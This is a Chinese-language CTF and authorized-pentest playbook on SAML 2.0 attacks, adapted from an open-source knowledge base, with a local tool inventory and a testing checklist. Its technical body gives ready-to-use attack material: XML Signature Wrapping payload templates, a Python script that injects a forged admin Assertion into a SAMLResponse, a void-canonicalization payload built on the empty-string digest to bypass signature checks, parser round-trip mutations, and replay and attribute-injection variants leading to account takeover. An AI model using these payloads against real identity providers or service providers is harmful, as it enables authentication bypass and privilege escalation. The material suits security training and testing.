# SAML 2.0 攻击

> **来源**：改编自 `LING71671/open-reverselab` 的 `kb/ctf-website/techniques/02-auth/saml-attacks.md`（GPL-3.0）。原 frontmatter 的 `mcp_tools` 映射已剔除——本技能包未挂载 `run_ctf_tool` / `http_probe`，改用本地工具链。
> **授权范围**：仅限 CTF 靶场 / AWD 赛场 / 已签署授权的测试环境。任何真实第三方目标、真实凭据、真实支付/生产流量都禁止套用本文流程。
> **什么时候用**：命中「SAML / XML Signature Wrapping / XSW / canonicalization」这类信号时，把本文当打点清单读；命中即进「步骤」，命中不了就换主题。

## 适用信号

- SAML
- XML Signature Wrapping
- XSW
- canonicalization
- SSO
- Assertion
- NameID
- XML

## 前置

- 授权：目标在 scope 内（`case-init.ps1` 已 grant），测试时段与限速已约定。
- 工具定位走探测层，别猜路径：

```powershell
. 'C:\relab2\skillpack\skills\scripts\lib\Bootstrap.ps1'
$r = Resolve-ReverseToolSpec -Name '<toolid>'   # 例：sqlmap / httpx / ffuf / curl / python
& $r.Command <参数>                                # 永远用完整路径，不依赖 cwd
```

- Python 解释器用探测层的 `python`（本机逆向库集中在 `D:\EXE\python\python.exe`，`venv-re` 是空壳，别去那里找库）。
- 本文脚本默认只读、只打点；扩大范围前先回到 scope 确认。
- 本文涉及的工具与本机实际状态（探测层 `Resolve-ReverseToolSpec` 于 2026-10-10 实测）：

| 工具 | 本机状态 | 本机命令 / 替代方案 |
|---|---|---|
| `playwright` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'playwright').Command ...` → `D:\Tools\Node\playwright.cmd` |
| `objection` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'objection').Command ...` → `D:\EXE\python\Scripts\objection.exe` |
| `subfinder` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'subfinder').Command ...` → `D:\Tools\subfinder\subfinder.exe` |
| `gobuster` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'gobuster').Command ...` → `D:\Tools\gobuster\gobuster.exe` |
| `mitmdump` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'mitmdump').Command ...` → `D:\EXE\python\Scripts\mitmdump.exe` |
| `binwalk` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'binwalk').Command ...` → `C:\Users\toti\.cargo\bin\binwalk.exe` |
| `openssl` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'openssl').Command ...` → `C:\Program Files\Git\usr\bin\openssl.exe` |
| `katana` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'katana').Command ...` → `D:\Tools\katana\katana.exe` |
| `nuclei` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'nuclei').Command ...` → `D:\Tools\nuclei\nuclei.exe` |
| `python` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'python').Command ...` → `D:\EXE\python\python.exe` |
| `sqlmap` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'sqlmap').Command ...` → `D:\Tools\sqlmap\sqlmap.py` |
| `tshark` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'tshark').Command ...` → `D:\Tools\Wireshark\tshark.exe` |
| `frida` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'frida').Command ...` → `D:\EXE\python\Scripts\frida.exe` |
| `httpx` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'httpx').Command ...` → `D:\Tools\httpx\httpx.exe` |
| `naabu` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'naabu').Command ...` → `D:\Tools\naabu\naabu.exe` |
| `curl` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'curl').Command ...` → `C:\WINDOWS\system32\curl.exe` |
| `dnsx` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'dnsx').Command ...` → `D:\Tools\dnsx\dnsx.exe` |
| `ffuf` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'ffuf').Command ...` → `D:\Tools\ffuf\ffuf.exe` |
| `nmap` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'nmap').Command ...` → `D:\Tools\nmap\nmap.exe` |
| `node` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'node').Command ...` → `D:\Tools\Node\node.exe` |
| `adb` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'adb').Command ...` → `D:\Tools\android\AndroidKiller_fix\bin\adb\adb.exe` |
| `git` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'git').Command ...` → `C:\Program Files\Git\cmd\git.exe` |
| `interactsh-client` | 未安装 | OOB 通道需自备回显服务（授权环境内的 VPS + `python -m http.server`）；本机无此工具 |
| `nuclei-templates` | 随 nuclei 提供 | `nuclei -t <模板目录>`；模板需联网 `-update-templates` |

- 上表中标「未安装」的工具**不要照抄原库的裸命令**：`Get-Command` 查空就下结论是错的，
  但四级探测 `Available=False` 是结论——此时按替代方案手写脚本，或先装再跑。


## 步骤

1. **SAML Replay / Attribute 注入** — 同一个 SAMLResponse 重放两次
2. **SAML Replay / Attribute 注入** — 换浏览器 session 重放
3. **SAML Replay / Attribute 注入** — 换 SP endpoint 重放
4. **SAML Replay / Attribute 注入** — 修改 RelayState 重放
5. **SAML Replay / Attribute 注入** — 过 NotOnOrAfter 后重放

## 判据

判据必须是外部可观测的（状态码、响应字段、差分、落盘文件），不是「命令有输出」。

- **观察点** — `Reference URI`
- **观察点** — Signature 位置
- **观察点** — 多个 Assertion
- **观察点** — `NameID` / `Attribute`
- **观察点** — `NotOnOrAfter`
- **观察点** — `AudienceRestriction`
- **命中条件** — 业务取第一个 Assertion
- **命中条件** — 业务取未签名 Assertion
- **命中条件** — 验签按 ID 找，业务按路径找
- **命中条件** — parser ID 属性识别不一致
- **命中条件** — 验签库追 Reference，业务不追
- **命中条件** — DOM/XPath 查询深度不同

## 坑

- 探针命令在**未本机验证**时不要当成既定事实跑；先用探测层确认 `Available=True`。
- 噪声排除：先固定 baseline（同 URL 同 token 跑 3 次），再只改一个变量做差分。
- 不要把「状态码 200」当命中——WAF/缓存/软 404 都返回 200，命中判据要落到具体业务字段。

## 相关

- 见本技能 `../../SKILL.md` 的 references 索引。

## 技术正文

> 以下为原库正文（保留全部技术细节与脚本），仅移除原 `MCP 工具映射` 章节并重写跨文档链接。

## 0. SAML Response 解码与定位

SAML 常见两种绑定：HTTP-POST 是 Base64 XML；HTTP-Redirect 是 DEFLATE + Base64 + URL encode。先确认绑定方式，再看签名在 `Response` 级还是 `Assertion` 级。

```python
import base64
import urllib.parse
import zlib
from lxml import etree

def decode_saml(value, binding="post"):
    raw = urllib.parse.unquote(value)
    data = base64.b64decode(raw)
    if binding == "redirect":
        data = zlib.decompress(data, -15)
    return data.decode(errors="replace")

def summarize_saml(xml_text):
    root = etree.fromstring(xml_text.encode())
    ids = root.xpath("//*[@ID or @Id or @id]")
    refs = root.xpath("//*[local-name()='Reference']/@URI")
    nameids = root.xpath("//*[local-name()='NameID']/text()")
    attrs = root.xpath("//*[local-name()='Attribute']/@Name")
    print("IDs:", [i.get("ID") or i.get("Id") or i.get("id") for i in ids])
    print("References:", refs)
    print("NameID:", nameids)
    print("Attributes:", attrs)
```

| 观察点 | 关键问题 | 下一步 |
|---|---|---|
| `Reference URI` | 签名到底保护哪个 ID | XSW 插入同名/旁路 Assertion |
| Signature 位置 | Response 级还是 Assertion 级 | 改业务读取节点 |
| 多个 Assertion | SP 取第一个、最后一个还是签名引用 | XSW pattern |
| `NameID` / `Attribute` | SP 用哪个字段当账号/角色 | 属性注入 |
| `NotOnOrAfter` | 时间窗口是否校验 | replay |
| `AudienceRestriction` | 是否绑定 SP entityID | token 混用 |

## XML Signature Wrapping (XSW)

SAML 断言用 XML 签名保护。签名验证和业务逻辑用**不同的 XML 解析器**，攻击者利用解析差异注入越权断言。

```python
# XSW 攻击脚本 — 示例 payload 模板
XSW_PAYLOADS = [
    # XSW1: 在合法 Assertion 外层包裹恶意 Assertion
    # 签名验证读内层(合法)，业务逻辑读外层(恶意)
    '''<?xml version="1.0"?>
    <Response>
      <Assertion ID="evil">  <!-- 外层: 业务逻辑读到这个 -->
        <Subject><NameID>admin@target.com</NameID></Subject>
        <AttributeStatement>
          <Attribute Name="role"><AttributeValue>admin</AttributeValue></Attribute>
        </AttributeStatement>
      </Assertion>
      <ds:Signature>
        <ds:SignedInfo><ds:Reference URI="#legit"/></ds:SignedInfo>
        <ds:SignatureValue>...</ds:SignatureValue>
      </ds:Signature>
      <Assertion ID="legit">  <!-- 内层: 签名验证这个 -->
        <Subject><NameID>user@target.com</NameID></Subject>
      </Assertion>
    </Response>''',

    # XSW2: Signature 外置 — 签名在 Response 级别
    # 验证 Response 签名 → 读里面的 Assertion → 攻击者注入第二个 Assertion

    # XSW8: 嵌套 Reference — 签名指向 outer Assertion
    # 但解析器取的是直接 child
]
```

### XSW Pattern 选择表

| Pattern | XML 形态 | 命中条件 |
|---|---|---|
| XSW1 | 恶意 Assertion 放 Response 顶部，合法 Assertion 保留签名 | 业务取第一个 Assertion |
| XSW2 | Signature 放 Response，插入第二个 Assertion | 业务取未签名 Assertion |
| XSW3 | 合法 Assertion 移入 Wrapper，恶意 Assertion 原位置 | 验签按 ID 找，业务按路径找 |
| XSW4 | 复制 Assertion ID / 改 `Id` vs `ID` | parser ID 属性识别不一致 |
| XSW5 | Object/Manifest 包裹签名目标 | 验签库追 Reference，业务不追 |
| XSW8 | 嵌套 Assertion | DOM/XPath 查询深度不同 |

最小实验：只改 `NameID` 不动签名，如果被接受，说明签名未验证或业务不使用签名节点；如果拒绝，再切 XSW。

### 利用脚本

```python
# saml_xsw.py — 拦截并修改 SAML Response
import requests, base64, zlib
from urllib.parse import unquote, quote

def intercept_and_wrap(saml_response: str, target_subject: str):
    """修改 SAML Response 中的用户身份"""
    # Step 1: 解码 SAML Response (Base64 → XML)
    decoded = base64.b64decode(unquote(saml_response)).decode()

    # Step 2: 注入恶意 Assertion (XSW1 模式)
    # 在根 Response 下插入我们的 Assertion
    malicious_assertion = f'''
    <saml:Assertion ID="evil" IssueInstant="2026-01-01T00:00:00Z" Version="2.0">
      <saml:Subject>
        <saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">
          {target_subject}
        </saml:NameID>
        <saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
          <saml:SubjectConfirmationData NotOnOrAfter="2099-01-01T00:00:00Z"
            Recipient="https://sp.target.com/acs"/>
        </saml:SubjectConfirmation>
      </saml:Subject>
      <saml:AttributeStatement>
        <saml:Attribute Name="role">
          <saml:AttributeValue>admin</saml:AttributeValue>
        </saml:Attribute>
      </saml:AttributeStatement>
    </saml:Assertion>'''

    # 注入到 Response 第一个位置
    poisoned = decoded.replace("</saml:Response>",
        malicious_assertion + "\n</saml:Response>", 1)

    # Step 3: 重编码
    return quote(base64.b64encode(poisoned.encode()).decode())
```

## Void Canonicalization

```python
# 2025年发现: 当 XML canonicalization 遇到错误(如相对 namespace URI)
# libxml2 返回空字符串而不是报错
# 摘要计算: SHA256("") = 47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=
# → 只需让签名引用一个 canonicalization 出错的元素
# → 摘要永远等于这个已知值 → 注入任意断言

VOID_NAMESPACE_PAYLOAD = '''<?xml version="1.0"?>
<Response xmlns:ns="1">  <!-- 相对 URI → canonicalization error → 空字符串 -->
  <Assertion ID="evil">
    <Subject><NameID>admin@evil.com</NameID></Subject>
  </Assertion>
  <ds:Signature>
    <ds:SignedInfo>
      <ds:CanonicalizationMethod Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
      <ds:Reference URI="#evil">  <!-- 引用 evil 断言 -->
        <ds:DigestMethod Algorithm="http://www.w3.org/2001/04/xmlenc#sha256"/>
        <!-- DigestValue = hash("") = 已知值 -->
        <ds:DigestValue>47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=</ds:DigestValue>
      </ds:Reference>
    </ds:SignedInfo>
    <ds:SignatureValue>任意值</ds:SignatureValue>
  </ds:Signature>
</Response>'''
```

## Round-Trip 攻击

```python
# 利用 XML 序列化→反序列化过程中的 parser 差异
# REXML vs Nokogiri (Ruby): CDATA、namespace prefix、注释的处理不同

ROUNDTRIP_MUTATIONS = [
    # CDATA 拆分
    ("NameID", '<![CDATA[user@t]]><![CDATA[arget.com]]'),
    # 多余注释注入 (不同解析器处理注释位置不同)
    ("Assertion", "<!-- --><Assertion ID='evil'>..."),
    # Namespace prefix 变更
    ('xmlns:ds="..."', 'xmlns:dsig="..."'),
]
```

## SAML Replay / Attribute 注入

```text
Replay 变量:
- 同一个 SAMLResponse 重放两次
- 换浏览器 session 重放
- 换 SP endpoint 重放
- 修改 RelayState 重放
- 过 NotOnOrAfter 后重放
```

| 字段 | 变形 | 命中信号 |
|---|---|---|
| `NameID` | `user` → `admin` | 登录身份变化 |
| `Attribute role` | 加 `admin` / `groups` | 权限变化 |
| `SessionIndex` | 删除/复用 | logout/session 逻辑错位 |
| `Audience` | 改成另一个 SP | 跨应用 token 混用 |
| `Recipient` | 改 ACS URL | callback 接受错位 |
| `InResponseTo` | 删除/复用 | SP 不绑定 AuthnRequest |

属性名常见别名：

```text
role
roles
groups
memberOf
isAdmin
admin
permissions
http://schemas.xmlsoap.org/claims/Group
http://schemas.microsoft.com/ws/2008/06/identity/claims/role
```

## SAML 测试工具

```bash
# SAMLRaider (Burp 插件) — SAML 断言可视化编辑
# SAML Encoder/Decoder — 编解码 SAML Request/Response
# saml2aws — AWS SAML 集成测试

# 手动解码
echo "$SAML_RESPONSE" | python3 -c "
import sys,base64,zlib
data=base64.b64decode(sys.stdin.read())
print(data.decode())
"

# 拦截 SAML 流量 — Burp Proxy → Proxy → HTTP History → filter for SAML
```

## 攻击链

```
SAML XSW → 注入 admin Assertion → SP 读到 admin 身份 → 后台访问
Void Canonicalization → 完全绕过签名验证 → 任意 SAML 断言 → 任意用户
SAML → 修改 NameID → 切换到目标用户 → 账户接管
SAML → Attribute 注入 → role=admin → 垂直提权
SAML Response Replay → 过期/重用 → 重放攻击
```

## Evidence

记录: 原始 SAMLResponse、绑定方式、解码 XML、`Reference URI`、签名位置、所有 Assertion/NameID/Attribute、注入的 Assertion、SP 最终接受的用户身份、成功样本和失败样本。
